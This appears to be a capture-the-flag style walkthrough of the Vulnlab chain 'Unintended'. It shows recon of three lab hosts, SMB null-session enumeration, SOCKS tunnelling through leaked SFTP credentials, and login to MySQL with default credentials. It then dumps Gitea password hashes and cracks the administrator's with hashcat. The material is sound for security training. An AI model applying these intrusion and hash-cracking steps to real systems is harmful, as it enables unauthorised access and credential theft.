---
layout: single
title:  "Vulnlab - Unintended"
date:   2024-05-01 00:00:00 +0200
categories: vulnlab
permalink: "/vulnlab-unintended"
excerpt: "Unintended is a medium difficulty chain on Vulnlab created by kavigihan."
---

{{ page.excerpt }}

It consists of three Linux machines. In some commands below the variables `$T1`, `$T2` and `$T3` will refer to the IP addresses of the first, second and third target respectively.

## nmap

```shell-session
└─$ sudo nmap 10.10.143.229-231 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 20:05 CEST
Nmap scan report for 10.10.143.229
Host is up (0.047s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

Nmap scan report for 10.10.143.230
Host is up (0.019s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown
8200/tcp open  trivnet1

Nmap scan report for 10.10.143.231
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 3 IP addresses (3 hosts up) scanned in 84.97 seconds
```

```shell-session
└─$ sudo nmap 10.10.143.229-231 -p- -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 20:13 CEST
Nmap scan report for 10.10.143.229
Host is up (0.017s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
|_  256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
53/tcp    open  domain       (generic dns response: NOTIMP)
88/tcp    open  kerberos-sec (server time: 2024-04-25 18:14:36Z)
| fingerprint-strings:
|   Kerberos:
|     d~b0`
|     20240425181436Z
|     krbtgt
|_    client in request
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Samba smbd 4.6.2
389/tcp   open  ldap         (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn  Samba smbd 4.6.2
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap     (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
3268/tcp  open  ldap         (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap     (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration
| Not valid before: 2024-02-24T19:33:59
|_Not valid after:  2026-01-24T19:33:59
|_ssl-date: TLS randomness does not represent time
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.94SVN%I=7%D=4/25%Time=662A9D81%P=x86_64-pc-linux-gnu%r(D
SF:NSStatusRequestTCP,E,"\0\x0c\0\0\x90\x04\0\0\0\0\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port88-TCP:V=7.94SVN%I=7%D=4/25%Time=662A9D7C%P=x86_64-pc-linux-gnu%r(K
SF:erberos,68,"\0\0\0d~b0`\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11
SF:\x18\x0f20240425181436Z\xa5\x05\x02\x03\x0cz\x13\xa6\x03\x02\x01\x06\xa
SF:9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x01\0\xa1\x0e0\x0c\x1b\x06krbt
SF:gt\x1b\x02NM\xab\x16\x1b\x14No\x20client\x20in\x20request");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: b0:7a:50:80:2a:7f (unknown)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-25T18:15:58
|_  start_date: N/A
|_clock-skew: 20s

Nmap scan report for 10.10.143.230
Host is up (0.018s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
|_  256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Werkzeug/3.0.1 Python/3.11.8
|_http-title: Under Construction
8065/tcp open  unknown
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3132
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com js.stripe.com/v3
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Thu, 25 Apr 2024 18:01:16 GMT
|     Permissions-Policy:
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: pu6yghftipdujdngj1mkryu7dc
|     X-Version-Id: 7.8.15.7.8.15.a67209e3f9507a23537760d9453206d5.false
|     Date: Thu, 25 Apr 2024 18:14:37 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Thu, 25 Apr 2024 18:14:37 GMT
|_    Content-Length: 0
8200/tcp open  http    Duplicati httpserver
|_http-server-header: Tiny WebServer
| http-title: Duplicati Login
|_Requested resource was /login.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.94SVN%I=7%D=4/25%Time=662A9D77%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,E71,"HTTP/1\.0\x20200\x20OK\r\nAccept-Range
SF:s:\x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20publ
SF:ic\r\nContent-Length:\x203132\r\nContent-Security-Policy:\x20frame-ance
SF:stors\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\x20js\
SF:.stripe\.com/v3\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLast
SF:-Modified:\x20Thu,\x2025\x20Apr\x202024\x2018:01:16\x20GMT\r\nPermissio
SF:ns-Policy:\x20\r\nReferrer-Policy:\x20no-referrer\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Request-Id:\x20
SF:pu6yghftipdujdngj1mkryu7dc\r\nX-Version-Id:\x207\.8\.15\.7\.8\.15\.a672
SF:09e3f9507a23537760d9453206d5\.false\r\nDate:\x20Thu,\x2025\x20Apr\x2020
SF:24\x2018:14:37\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><he
SF:ad><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport\"\x20content=\"w
SF:idth=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"><me
SF:ta\x20name=\"robots\"\x20content=\"noindex,\x20nofollow\"><meta\x20name
SF:=\"referrer\"\x20content=\"no-referrer\"><title>Mattermost</title><meta
SF:\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"><meta\x20name")%
SF:r(HTTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:
SF:\x20Thu,\x2025\x20Apr\x202024\x2018:14:37\x20GMT\r\nContent-Length:\x20
SF:0\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCoo
SF:kie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Service Info: Host: web.unintended.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.10.143.231
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.7
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 10.10.143.231:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
|_  256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Post-scan script results:
| ssh-hostkey: Possible duplicate hosts
| Key 256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519) used by:
|   10.10.143.229
|   10.10.143.230
|   10.10.143.231
| Key 256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA) used by:
|   10.10.143.229
|   10.10.143.230
|_  10.10.143.231
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 161.75 seconds
```

The scans show that the first machine is a Linux domain controller using [Samba AD](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller). The other two machines are then likely also joined to the domain.

Let's add the relevant entries in `/etc/hosts` for the DC.

```shell-session
└─$ echo "$T1 dc.unintended.vl dc unintended.vl" | sudo tee -a /etc/hosts
10.10.143.229 dc.unintended.vl dc unintended.vl
```

## Domain enumeration (unauthenticated)

```shell-session
└─$ ldapsearch -H ldap://dc -x -LLL -s base -b ''
dn:
configurationNamingContext: CN=Configuration,DC=unintended,DC=vl
defaultNamingContext: DC=unintended,DC=vl
rootDomainNamingContext: DC=unintended,DC=vl
schemaNamingContext: CN=Schema,CN=Configuration,DC=unintended,DC=vl
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=unintended,DC=vl
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedLDAPVersion: 2
supportedLDAPVersion: 3
vendorName: Samba Team (https://www.samba.org)
isSynchronized: TRUE
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=unintended,DC=vl
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=unintended,DC=vl
dnsHostName: dc.unintended.vl
ldapServiceName: unintended.vl:dc$@UNINTENDED.VL
currentTime: 20240425182705.0Z
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.1341
namingContexts: DC=unintended,DC=vl
namingContexts: CN=Configuration,DC=unintended,DC=vl
namingContexts: CN=Schema,CN=Configuration,DC=unintended,DC=vl
namingContexts: DC=DomainDnsZones,DC=unintended,DC=vl
namingContexts: DC=ForestDnsZones,DC=unintended,DC=vl
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: NTLM
highestCommittedUSN: 4155
domainFunctionality: 4
forestFunctionality: 4
domainControllerFunctionality: 4
isGlobalCatalogReady: TRUE
```

```shell-session
└─$ nxc smb dc   
SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
```

We can enumerate users and shares with a SMB null session:

```shell-session
└─$ nxc smb dc -u '' -p '' --users          
SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.143.229   445    DC               [+] unintended.vl\: 
SMB         10.10.143.229   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.143.229   445    DC               Administrator                 2024-02-24 19:33:16 0       Built-in account for administering the computer/domain 
SMB         10.10.143.229   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.143.229   445    DC               krbtgt                        2024-02-24 19:33:16 0       Key Distribution Center Service Account 
SMB         10.10.143.229   445    DC               juan                          2024-02-24 19:40:31 0        
SMB         10.10.143.229   445    DC               abbie                         2024-02-24 19:40:32 0        
SMB         10.10.143.229   445    DC               cartor                        2024-02-24 19:40:32 0        
```

```shell-session
└─$ nxc smb dc -u '' -p '' --shares
SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.143.229   445    DC               [+] unintended.vl\: 
SMB         10.10.143.229   445    DC               [*] Enumerated shares
SMB         10.10.143.229   445    DC               Share           Permissions     Remark
SMB         10.10.143.229   445    DC               -----           -----------     ------
SMB         10.10.143.229   445    DC               sysvol                          
SMB         10.10.143.229   445    DC               netlogon                        
SMB         10.10.143.229   445    DC               home                            Home Directories
SMB         10.10.143.229   445    DC               IPC$                            IPC Service (Samba 4.15.13-Ubuntu)
```

We can also use `rpcclient` to generate a list of users:

```shell-session
└─$ rpcclient -U '' -N $T1 -c enumdomusers | cut -d'[' -f2 | cut -d']' -f1 | tee users.txt
Administrator
Guest
krbtgt
juan
abbie
cartor
```

## Web recon

Let's take a look at the website on port 80 of target 2:

<http://10.10.143.230/>

![](/assets/vulnlab/chains/unintended/img/1.png)

Nothing interesting except the `admin@web.unintended.vl` email indicating the potential usage of virtual hosts. Let's try to brute-force:

```shell-session
└─$ ffuf -u http://$T2/ -H 'Host: FUZZ.unintended.vl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.153.134/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.unintended.vl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

chat                    [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 26ms]
code                    [Status: 200, Size: 13651, Words: 1050, Lines: 272, Duration: 20ms]
#www                    [Status: 400, Size: 309, Words: 26, Lines: 11, Duration: 15ms]
#mail                   [Status: 400, Size: 309, Words: 26, Lines: 11, Duration: 19ms]
:: Progress: [19966/19966] :: Job [1/1] :: 512 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

We can also [brute-force the DNS service](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#dns-subdomains-bf) on the DC.

```shell-session
└─$ dnsenum --dnsserver $T1 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt unintended.vl
dnsenum VERSION:1.2.6

-----   unintended.vl   -----


Host's addresses:
__________________

unintended.vl.                           900      IN    A        10.10.180.21


Name Servers:
______________

dc.unintended.vl.                        3600     IN    A        10.10.180.21


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: dc.unintended.vl at /usr/bin/dnsenum line 897 thread 2.

Trying Zone Transfer for unintended.vl on dc.unintended.vl ...
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:
_______________________________________________________________________________________

web.unintended.vl.                       900      IN    A        10.10.10.12
web.unintended.vl.                       900      IN    A        10.10.180.22
backup.unintended.vl.                    900      IN    A        10.10.10.13
backup.unintended.vl.                    900      IN    A        10.10.180.23
chat.unintended.vl.                      900      IN    A        10.10.180.22
dc.unintended.vl.                        3600     IN    A        10.10.180.21
code.unintended.vl.                      900      IN    A        10.10.10.12
code.unintended.vl.                      900      IN    A        10.10.180.22
gc._msdcs.unintended.vl.                 900      IN    A        10.10.180.21
domaindnszones.unintended.vl.            900      IN    A        10.10.180.21
forestdnszones.unintended.vl.            900      IN    A        10.10.180.21


Launching Whois Queries:
_________________________



unintended.vl_____________



Performing reverse lookup on 0 ip addresses:
_____________________________________________


0 results out of 0 IP addresses.


unintended.vl ip blocks:
_________________________


done.
```

Then add the found subdomains to `/etc/hosts`:

```shell-session
└─$ echo "$T2 web.unintended.vl chat.unintended.vl code.unintended.vl" | sudo tee -a /etc/hosts
10.10.143.230 web.unintended.vl chat.unintended.vl code.unintended.vl
```

```shell-session
└─$ echo "$T3 backup.unintended.vl" | sudo tee -a /etc/hosts           
10.10.143.231 backup.unintended.vl
```

A [Mattermost](https://mattermost.com/) instance is accessible at <http://chat.unintended.vl/>, but we can't login yet. It's also exposed on port 8065.

![](/assets/vulnlab/chains/unintended/img/2.png)

A [Gitea](https://about.gitea.com/) instance is available at <http://code.unintended.vl>.

![](/assets/vulnlab/chains/unintended/img/3.png)

Finally a [Duplicati](https://duplicati.com/) web UI is exposed at <http://web.unintended.vl:8200>, but we don't have the password.

![](/assets/vulnlab/chains/unintended/img/4.png)

## Gitea (unauthenticated)

Even without credentials we can enumerate the users at <http://code.unintended.vl/explore/users>.

![](/assets/vulnlab/chains/unintended/img/5.png)

We can enumerate repositories at <http://code.unintended.vl/explore/repos>. There's a public repository, <http://code.unintended.vl/juan/DevOps>.

![](/assets/vulnlab/chains/unintended/img/6.png)

It has some Ansible and Docker related files.

We can take a look at the commit history:

![](/assets/vulnlab/chains/unintended/img/7.png)

In one of the commits we find potentially real SFTP credentials replaced by generic ones:

<http://code.unintended.vl/juan/DevOps/commit/75f1f713696016f7713e33f836b05ce14784fc22>

![](/assets/vulnlab/chains/unintended/img/8.png)

It doesn't allow SSH login:

```shell-session
└─$ sshpass -p <SFTP_PASS> ssh ftp_user@$T2
This service allows sftp connections only.
Connection to 10.10.143.230 closed.
```

There's no files we can read over SFTP:

```shell-session
└─$ sshpass -p <SFTP_PASS> sftp ftp_user@$T2
Warning: Permanently added '10.10.228.198' (ED25519) to the list of known hosts.
Connected to 10.10.228.198.
sftp> ls -lah
drwxr-xr-x    ? 0        0            4.0K Feb 24 20:47 .
drwxr-xr-x    ? 0        0            4.0K Feb 24 20:47 ..
drwx------    ? 1001     1001         4.0K Feb 24 20:47 ftp_user
sftp> cd ftp_user/
sftp> ls -lah
drwx------    ? 1001     1001         4.0K Feb 24 20:47 .
drwxr-xr-x    ? 0        0            4.0K Feb 24 20:47 ..
sftp> exit
```

According to [this section on HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#sftp-tunneling) the SFTP service may be misconfigured to allow port forwarding and tunneling even if it disallows SSH login, allowing us to probe and reach internal ports and networks.

Let's set up a SOCKS proxy:

```shell-session
└─$ sshpass -p <SFTP_PASS> ssh -D 9050 -N ftp_user@$T2
```

Update `/etc/proxychains4.conf` if necessary:

```
socks4 127.0.0.1 9050
```

Then scan for ports exposed on localhost:

```shell-session
└─$ proxychains nmap 127.0.0.1 -p-
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 18:10 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.018s latency).
Not shown: 65525 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
222/tcp   open  rsh-spx
3000/tcp  open  ppp
3306/tcp  open  mysql
8000/tcp  open  http-alt
8065/tcp  open  unknown
8200/tcp  open  trivnet1
42603/tcp open  unknown
58050/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1256.71 seconds
```

We found some new ports. We can connect to the MySQL port (3306) with default credentials:

```shell-session
└─$ proxychains mysql -h 127.0.0.1 -u root -proot
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 427
Server version: 8.3.0 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

It's used by Gitea:

```sql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.021 sec)
```

```sql
MySQL [(none)]> use gitea;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```sql
MySQL [gitea]> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| action_artifact           |
| action_run                |
| action_run_index          |
| action_run_job            |
| action_runner             |
| action_runner_token       |
| action_schedule           |
| action_schedule_spec      |
| action_task               |
| action_task_output        |
| action_task_step          |
| action_tasks_version      |
| action_variable           |
| app_state                 |
| attachment                |
| badge                     |
| branch                    |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| dbfs_data                 |
| dbfs_meta                 |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| org_user                  |
| package                   |
| package_blob              |
| package_blob_upload       |
| package_cleanup_rule      |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| secret                    |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
107 rows in set (0.020 sec)
```

There seems to be a private repository `home-backup`:

```sql
MySQL [gitea]> select owner_name,name,description from repository;
+------------+-------------+-----------------------------------------------------------------+
| owner_name | name        | description                                                     |
+------------+-------------+-----------------------------------------------------------------+
| juan       | DevOps      | Templates and config files for automation and server management |
| juan       | home-backup | Backup for home directory in WEB                                |
+------------+-------------+-----------------------------------------------------------------+
2 rows in set (0.022 sec)
```

Let's extract the hashes:

```sql
MySQL [gitea]> select email,passwd,passwd_hash_algo,salt,is_admin from user;
+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
| email                       | passwd                                                                                               | passwd_hash_algo | salt                             | is_admin |
+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
| administrator@unintended.vl | f57a3d5d199ac8054c709e665b4eb4842f0e172a253a96038be5ef9e6fe7b0290f2d715524883dd117ac309e878c1dbbe902 | pbkdf2$50000$50  | 6f7cf4aa34feb922092ef9f7ca342fa5 |        1 |
| juan@unintended.vl          | d8bf3dff89969075cd73cc1496942901ea132619454318cb37e4bec821d6867045bcbc0ac2905c2531ee5d6e6c5a475c9b51 | pbkdf2$50000$50  | a3914c8815b674a9f680eaf8eb799e19 |        0 |
+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------------------+----------+
2 rows in set (0.021 sec)
```

By looking at the [Gitea source code](https://github.com/go-gitea/gitea/blob/fd63b96f6a4c5b3ea9e53d37af85e0d2d09715b9/modules/auth/password/hash/pbkdf2.go) we can confirm it uses PBKDF2 with SHA256 as the hash algorithm.

In the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) we can find the format to crack a PBKDF2 hash:

```
10900 	PBKDF2-HMAC-SHA256 	sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt 
```

The correct format is `sha256:<number_of_iterations>:<base64_salt>:<base64_hash>`.

In the database we can see that the number of iterations is 50000. The salt and hash are in hex so we need to convert them to Base64.

Let's try to crack the administrator's hash:

```shell-session
└─$ echo '6f7cf4aa34feb922092ef9f7ca342fa5' | xxd -r -p | base64
b3z0qjT+uSIJLvn3yjQvpQ==
```

```shell-session
└─$ echo 'f57a3d5d199ac8054c709e665b4eb4842f0e172a253a96038be5ef9e6fe7b0290f2d715524883dd117ac309e878c1dbbe902' | xxd -r -p | base64
9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=
```

Save in `administrator.gitea.hash`:

```
sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=
```

```shell-session
└─$ hashcat -a0 -m10900 administrator.gitea.hash /usr/share/wordlists/rockyou.txt
...
sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=:<ADMIN_GITEA_PASS>
```

We can try to do the same with juan's hash but it doesn't crack with `rockyou.txt`.

## Gitea (as administrator)

Now we can login to Gitea with the administrator's password we just cracked, and access the private repository `home-backup` at <http://code.unintended.vl/juan/home-backup>.

![](/assets/vulnlab/chains/unintended/img/9.png)

